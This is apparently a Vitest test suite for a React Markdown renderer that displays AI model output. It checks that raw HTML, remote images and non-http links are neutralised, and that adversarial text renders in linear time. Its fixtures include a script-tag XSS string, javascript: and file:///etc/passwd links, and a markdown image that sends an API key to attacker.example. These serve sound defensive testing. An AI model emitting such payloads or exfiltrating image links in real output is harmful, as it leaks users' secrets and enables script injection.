/** Security 5: model output (and skill bodies, which use the same component)
 * renders as React nodes only. Raw HTML is text, remote images never load,
 * and links are http(s) only, open without an opener and show their URL. */
import React from 'react';
import { render, screen } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { MARKDOWN_LIMIT, Markdown } from './markdown';

describe('Markdown rendering limits', () => {
  it('raw HTML stays text, with no element created from it', () => {
    const { container } = render(<Markdown text={'<script>alert(1)</script> <iframe src="https://x"></iframe> <b>bold</b>'} />);
    expect(container.querySelector('script, iframe, b')).toBeNull();
    expect(container.textContent).toContain('<script>alert(1)</script>');
  });

  it('a remote image is link text, never an <img> (no request leaves the page)', () => {
    const { container } = render(<Markdown text={'See ![chart](https://attacker.example/x.png?data=API_KEY) here.'} />);
    expect(container.querySelector('img')).toBeNull();
    const link = screen.getByRole('link', { name: '[image: chart]' });
    expect(link).toHaveAttribute('href', 'https://attacker.example/x.png?data=API_KEY');
    expect(link).toHaveAttribute('title', 'https://attacker.example/x.png?data=API_KEY');
    expect(container.textContent).not.toContain('!');
  });

  it('an image with a non-http URL stays raw text', () => {
    const { container } = render(<Markdown text={'![x](data:image/png;base64,AAAA) ![y](javascript:alert(1))'} />);
    expect(container.querySelector('img, a')).toBeNull();
    expect(container.textContent).toContain('![x](data:image/png;base64,AAAA)');
  });

  it('links: http(s) only, new tab without opener, full URL in the title', () => {
    const { container } = render(<Markdown text={'[safe](https://example.com/a?b=c) [bad](javascript:alert(1)) [file](file:///etc/passwd)'} />);
    const links = container.querySelectorAll('a');
    expect(links).toHaveLength(1);
    expect(links[0]).toHaveAttribute('href', 'https://example.com/a?b=c');
    expect(links[0]).toHaveAttribute('target', '_blank');
    expect(links[0]).toHaveAttribute('rel', 'noopener noreferrer');
    expect(links[0]).toHaveAttribute('title', 'https://example.com/a?b=c');
    expect(container.textContent).toContain('[bad](javascript:alert(1))');
  });
});

describe('SEC2: hostile text renders in linear time', () => {
  // Wall-clock limits fail on a slow, shared CI runner under coverage. What the
  // fix guarantees is the growth rate, so these tests time n and 4n units and
  // compare: linear work grows about 4x, quadratic 16x, cubic 64x. Measured
  // under coverage, the fixed parser stays at 5.2x or less, with rare spikes to
  // about 9x when the whole suite runs in parallel; the old parser measured
  // 10.3x to 14.7x on the openers and about 52x on the cubic case, every run.
  // Each timing test is retried twice: a transient load spike would have to hit
  // three attempts in a row, while a super-linear parser fails every attempt.
  // CEILING_MS is only a backstop against a hang, in seconds, not a budget.
  const FACTOR = 4;
  const RATIO_LIMIT = 8;
  const TIMING = { timeout: 60_000, retry: 2 };
  const CEILING_MS = 3000;
  const render = (text: string) => renderToStaticMarkup(<Markdown text={text} />);

  /** Time per render over one round: the render repeats for at least 50 ms so
   * sub-millisecond renders are measurable. */
  const round = (text: string): number => {
    let reps = 0;
    const start = performance.now();
    let elapsed = 0;
    do { render(text); reps++; elapsed = performance.now() - start; } while (elapsed < 50 && reps < 5000);
    return elapsed / reps;
  };
  const once = (text: string): number => {
    const start = performance.now();
    render(text);
    return performance.now() - start;
  };
  /** Backstop only: the best of three single renders. */
  const perRender = (text: string): number => Math.min(once(text), once(text), once(text));

  /** Times `make(n)` and `make(FACTOR * n)` in alternating rounds and compares their
   * minimums, so a load spike on a shared runner hits both sizes or neither. */
  const expectLinear = (make: (n: number) => string, n: number) => {
    const smallText = make(n);
    const largeText = make(FACTOR * n);
    // Both sizes must go through the markdown parser, not the plain-text fallback.
    expect(largeText.length).toBeLessThanOrEqual(MARKDOWN_LIMIT);
    // Warm-up, and the backstop against a hang before any timed loop.
    const smallWarm = once(smallText);
    expect(smallWarm, `${n} units took ${smallWarm.toFixed(1)} ms`).toBeLessThan(CEILING_MS);
    const largeWarm = once(largeText);
    if (largeWarm > CEILING_MS) {
      // A super-linear parser: report the growth from the single renders.
      expect(largeWarm / smallWarm, `${FACTOR}x the input took ${(largeWarm / smallWarm).toFixed(1)}x the time (linear is about ${FACTOR})`).toBeLessThan(RATIO_LIMIT);
      expect(largeWarm, `${FACTOR * n} units took ${largeWarm.toFixed(1)} ms`).toBeLessThan(CEILING_MS);
    }
    let small = Infinity;
    let large = Infinity;
    for (let index = 0; index < 5; index++) {
      small = Math.min(small, round(smallText));
      large = Math.min(large, round(largeText));
    }
    expect(large / small, `${FACTOR}x the input took ${(large / small).toFixed(1)}x the time (linear is about ${FACTOR})`).toBeLessThan(RATIO_LIMIT);
  };

  // Warm the JIT once so the first measured case is not charged for it.
  render('`x` **b** *i* [l](https://e.com) ![a](https://e.com/i.png)');

  it('`x`![a]( repeated (cubic before) grows linearly: 250 vs 1000 units', TIMING, () => {
    expectLinear((n) => '`x`![a]('.repeat(n), 250);
  });

  it.each([
    ['italic', ' *a'], ['bold', '**a'], ['link', '[a]('], ['image', '![a]('], ['code and italic', '`x` *a '], ['code and bold', '`x` **a '],
  ])('%s openers without closers grow linearly: 900 vs 3600 units', TIMING, (_name, unit) => {
    expectLinear((n) => unit.repeat(n), 900);
  });

  it('an ordinary document with every construct grows linearly: 7.5 KB vs 30 KB', TIMING, () => {
    const block = '## Section\n\nSome **bold** and *italic* text with `code`, a [link](https://example.com/a) and ![img](https://example.com/i.png).\n\n- item one\n- item two\n\n```\ncode block\n```\n\n';
    expectLinear((n) => block.repeat(n), Math.floor(7_500 / block.length));
  });

  it('a 64 KB document is shown as plain text, without markdown, well under the backstop', TIMING, () => {
    const text = 'plain **not bold** [not](https://a.b) '.repeat(Math.ceil(65_536 / 38));
    expect(perRender(text)).toBeLessThan(CEILING_MS);
    const html = render(text);
    expect(html.startsWith('<pre class="gcp-md-plain">')).toBe(true);
    expect(html).not.toContain('<strong>');
    expect(html).not.toContain('<a ');
  });
});
